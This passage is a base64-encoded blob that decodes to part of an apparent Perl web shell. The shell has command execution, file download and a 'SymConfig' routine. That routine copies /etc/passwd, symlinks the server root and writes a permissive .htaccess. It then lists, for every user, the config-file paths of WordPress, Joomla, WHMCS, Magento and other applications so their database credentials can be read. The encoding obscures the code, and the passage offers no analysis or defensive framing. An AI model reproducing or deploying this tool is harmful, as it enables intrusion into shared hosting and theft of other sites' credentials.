ENvbW1hbmRgOw0KICAgICAgICB9DQogICAgICAgIGlmKCEkV2luTlQpDQogICAgICAgIHsNCiAgICAgICAgICAgIGFsYXJtKDApOw0KICAgICAgICB9DQogICAgICAgIHByaW50ICI8L3htcD4iOw0KICAgIH0NCiAgICAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCiAgICAmUHJpbnRQYWdlRm9vdGVyOw0KfQ0Kc3ViIFByaW50RG93bmxvYWRMaW5rUGFnZQ0Kew0KbG9jYWwoJEZpbGVVcmwpID0gQF87DQppZigtZSAkRmlsZVVybCkgIyBpZiB0aGUgZmlsZSBleGlzdHMNCnsNCiMgZW5jb2RlIHRoZSBmaWxlIGxpbmsgc28gd2UgY2FuIHNlbmQgaXQgdG8gdGhlIGJyb3dzZXINCiRGaWxlVXJsID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsNCiREb3dubG9hZExpbmsgPSAiJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZj0kRmlsZVVybCZvPWdvIjsNCiRIdG1sTWV0YUhlYWRlciA9ICI8bWV0YSBIVFRQLUVRVUlWPVwiUmVmcmVzaFwiIENPTlRFTlQ9XCIxOyBVUkw9JERvd25sb2FkTGlua1wiPiI7DQomUHJpbnRQYWdlSGVhZGVyKCJjIik7DQpwcmludCA8PEVORDsNCjxjb2RlPg0KU2VuZGluZyBGaWxlICRUcmFuc2ZlckZpbGUuLi48YnI+DQpJZiB0aGUgZG93bmxvYWQgZG9lcyBub3Qgc3RhcnQgYXV0b21hdGljYWxseSwNCjxhIGhyZWY9IiREb3dubG9hZExpbmsiPkNsaWNrIEhlcmU8L2E+Lg0KPC9jb2RlPg0KRU5EDQomUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCiZQcmludFBhZ2VGb290ZXI7DQp9DQplbHNlICMgZmlsZSBkb2Vzbid0IGV4aXN0DQp7DQomUHJpbnRQYWdlSGVhZGVyKCJmIik7DQpwcmludCAiPGNvZGU+RmFpbGVkIHRvIGRvd25sb2FkICRGaWxlVXJsOiAkITwvY29kZT4iOw0KJlByaW50RmlsZURvd25sb2FkRm9ybTsNCiZQcmludFBhZ2VGb290ZXI7DQp9DQp9DQpzdWIgU3ltQ29uZmlnDQp7DQojIS91c3IvYmluL3BlcmwgLUkvdXNyL2xvY2FsL2JhbmRtaW4NCnVzZSBGaWxlOjpDb3B5OyB1c2Ugc3RyaWN0OyB1c2Ugd2FybmluZ3M7IHVzZSBNSU1FOjpCYXNlNjQ7DQpteSAkZmlsZW5hbWUgPSAncGFzc3dkLnR4dCc7DQppZiAoIS1lICRmaWxlbmFtZSkgeyBjb3B5KCIvZXRjL3Bhc3N3ZCIsInBhc3N3ZC50eHQiKSA7DQp9DQpta2RpciAic3ltbGlua19jb25maWciOw0Kc3ltbGluaygiLyIsInN5bWxpbmtfY29uZmlnL3Jvb3QiKTsNCm15ICRodGFjY2VzcyA9IGRlY29kZV9iYXNlNjQoIlQzQjBhVzl1Y3lCSmJtUmxlR1Z6SUVadmJHeHZkMU41YlV4cGJtdHpEUXBFYVhKbFkzUnZjbmxKYm1SbGVDQmpiMjQzWlhoMExtaDBiUTBLUVdSa1ZIbHdaU0IwWlhoMEwzQnNZV2x1SUM1d2FIQWdEUXBCWkdSSVlXNWtiR1Z5SUhSbGVIUXZjR3hoYVc0Z0xuQm9jQTBLVTJGMGFYTm1lU0JCYm5rTkNrbHVaR1Y0VDNCMGFXOXVjeUFyUTJoaGNuTmxkRDFWVkVZdE9DQXJSbUZ1WTNsSmJtUmxlR2x1WnlBclNXZHViM0psUTJGelpTQXJSbTlzWkdWeWMwWnBjbk4wSUN0WVNGUk5UQ0FyU0ZSTlRGUmhZbXhsSUN0VGRYQndjbVZ6YzFKMWJHVnpJQ3RUZFhCd2NtVnpjMFJsYzJOeWFYQjBhVzl1SUN0T1lXMWxWMmxrZEdnOUtpQU5Da2x1WkdWNFNXZHViM0psSUNvdWRIaDBOREEwRFFwU1pYZHlhWFJsUlc1bmFXNWxJRTl1RFFwU1pYZHlhWFJsUTI5dVpDQWxlMUpGVVZWRlUxUmZSa2xNUlU1QlRVVjlJRjR1S25ONWJXeHBibXRmWTI5dVptbG5JRnRPUTEwTkNsSmxkM0pwZEdWU2RXeGxJRnd1ZEhoMEpDQWxlMUpGVVZWRlUxUmZWVkpKZlRRd05DQmJUQ3hTUFRNd01pNU9RMTA9Iik7DQpteSAkeHN5bTQwNCA9IGRlY29kZV9iYXNlNjQoIlQzQjBhVzl1Y3lCSmJtUmxlR1Z6SUVadmJHeHZkMU41YlV4cGJtdHpEUXBFYVhKbFkzUnZjbmxKYm1SbGVDQmpiMjQzWlhoMExtaDBiUTBLU0dWaFpHVnlUbUZ0WlNCd2NIRXVkSGgwRFFwVFlYUnBjMlo1SUVGdWVRMEtTVzVrWlhoUGNIUnBiMjV6SUVsbmJtOXlaVU5oYzJVZ1JtRnVZM2xKYm1SbGVHbHVaeUJHYjJ4a1pYSnpSbWx5YzNRZ1RtRnRaVmRwWkhSb1BTb2dSR1Z6WTNKcGNIUnBiMjVYYVdSMGFEMHFJRk4xY0hCeVpYTnpTRlJOVEZCeVpXRnRZbXhsRFFwSmJtUmxlRWxuYm05eVpTQXEiKTsNCm9wZW4obXkgJGZoMSwgJz4nLCAnc3ltbGlua19jb25maWcvLmh0YWNjZXNzJyk7IHByaW50ICRmaDEgIiRodGFjY2VzcyI7IGNsb3NlICRmaDE7IG9wZW4obXkgJHh4LCAnPicsICdzeW1saW5rX2NvbmZpZy9uZW11LnR4dCcpOyBwcmludCAkeHggIiR4c3ltNDA0IjsgY2xvc2UgJHh4OyBvcGVuKG15ICRmaCwgJzw6ZW5jb2RpbmcoVVRGLTgpJywgJGZpbGVuYW1lKTsgd2hpbGUgKG15ICRyb3cgPSA8JGZoPikgeyBteSBAbWF0Y2hlcyA9ICRyb3cgPX4gLyguKj8pOng6L2c7IG15ICR1c2VybnlhID0gJDE7IG15IEBhcnJheSA9ICgge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nLy5hY2Nlc3NoYXNoJywgdHlwZSA9PiAnV0hNLWFjY2Vzc2hhc2gnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jb25maWcva29uZWtzaS5waHAnLCB0eXBlID0+ICdMb2tvbWVkaWEnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9saWIvY29uZmlnLnBocCcsIHR5cGUgPT4gJ0JhbGl0YmFuZycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NvbmZpZy9zZXR0aW5ncy5pbmMucGhwJywgdHlwZSA9PiAnUHJlc3RhU2hvcCcgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2FwcC9ldGMvbG9jYWwueG1sJywgdHlwZSA9PiAnTWFnZW50bycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCB0eXBlID0+ICdPcGVuQ2FydCcgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2FwcGxpY2F0aW9uL2NvbmZpZy9kYXRhYmFzZS5waHAnLCB0eXBlID0+ICdFbGxpc2xhYicgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93cC90ZXN0L3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iZXRhL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9wb3J0YWwvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NpdGUvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dwL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XUC93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbmV3cy93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd29yZHByZXNzL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC90ZXN0L3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9kZW1vL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ob21lL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC92MS93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdjIvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3ByZXNzL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9uZXcvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Jsb2dzL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Jsb2cvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnXldITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY21zL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmV0YS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3BvcnRhbC9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NpdGUvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9tYWluL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2RlbW8vY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC90ZXN0L2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdjEvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC92Mi9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2pvb21sYS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL25ldy9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dITUNTL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobWNzMS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XaG1jcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93aG1jcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93aG1jcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XSE1DL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dobWMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd2htYy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XSE0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV2htL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9IT1NUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0hvc3Qvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvaG9zdC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9TVVBQT1JURVMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU3VwcG9ydGVzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3N1cHBvcnRlcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9kb21haW5zL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2RvbWFpbi9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9Ib3N0aW5nL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0hPU1RJTkcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvaG9zdGluZy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DQVJUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NhcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2FydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9PUkRFUi9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9PcmRlci9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9vcmRlci9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DTElFTlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NsaWVudC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DTElFTlRBUkVBL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NsaWVudGFyZWEvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50YXJlYS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9TVVBQT1JUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1N1cHBvcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CSUxMSU5HL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JpbGxpbmcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmlsbGluZy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CVVkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQnV5L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2J1eS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9NQU5BR0Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTWFuYWdlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL21hbmFnZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DTElFTlRTVVBQT1JUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NsaWVudFN1cHBvcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50c3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbGllbnRzdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NIRUNLT1VUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NoZWNrb3V0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NoZWNrb3V0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJTExJTkdTL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JpbGxpbmdzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JpbGxpbmdzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JBU0tFVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CYXNrZXQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmFza2V0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NFQ1VSRS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9TZWN1cmUvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2VjdXJlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NBTEVTL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NhbGVzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NhbGVzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA